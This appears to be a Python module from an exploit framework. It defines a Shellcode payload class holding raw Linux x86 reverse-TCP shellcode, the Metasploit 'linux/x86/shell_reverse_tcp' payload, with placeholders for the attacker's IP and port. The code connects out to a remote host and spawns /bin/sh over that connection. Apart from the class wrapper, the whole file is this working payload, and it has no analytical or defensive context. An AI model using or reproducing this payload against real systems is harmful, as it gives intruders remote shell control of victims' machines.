from payload_model import Payload

class Shellcode(Payload):
    #TODO remove null bytes
    def __init__(self):
        shellcode =  b"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66"
        shellcode += b"\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68%s"
        shellcode += b"\x68\x02%s\x89\xe1\xb0\x66\x50"
        shellcode += b"\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73"
        shellcode += b"\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0"
        shellcode += b"\x0b\xcd\x80"
        size = 68
        use_metaploit = True
        info_metasploit = "linux/x86/shell_reverse_tcp"
        super(Shellcode,self).__init__(shellcode, size, use_metaploit, info_metasploit, "x86")